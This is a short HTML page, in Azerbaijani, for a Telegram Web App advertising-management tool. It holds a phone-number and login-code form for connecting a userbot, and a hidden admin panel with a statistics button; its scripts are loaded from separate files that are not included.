<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reklam İdarəetmə</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container" style="background-image: url('https://i.ibb.co/3mpQz6vc/MG-20261108-WA0070.jpg');">
        <div class="overlay">
            <h2>Mərkəzi Reklam Sistemi</h2>
            
            <!-- Userbot Qoşulma Forması -->
            <div id="auth-section">
                <input type="text" id="phone" placeholder="Telefon nömrəsi (+994...)">
                <button onclick="sendCode()">Kod Göndər</button>
                
                <div id="code-section" style="display:none;">
                    <input type="text" id="code" placeholder="5 rəqəmli kod">
                    <button onclick="verifyCode()">Təsdiqlə</button>
                </div>
            </div>

            <!-- Admin Panel (Gizli olacaq) -->
            <div id="admin-panel" style="display:none;">
                <h3>Admin Panel</h3>
                <button onclick="loadDashboard()">Statistikaları Yenilə</button>
                <div id="stats-box"></div>
            </div>
        </div>
    </div>
    <script src="app.js"></script>
</body>
</html>
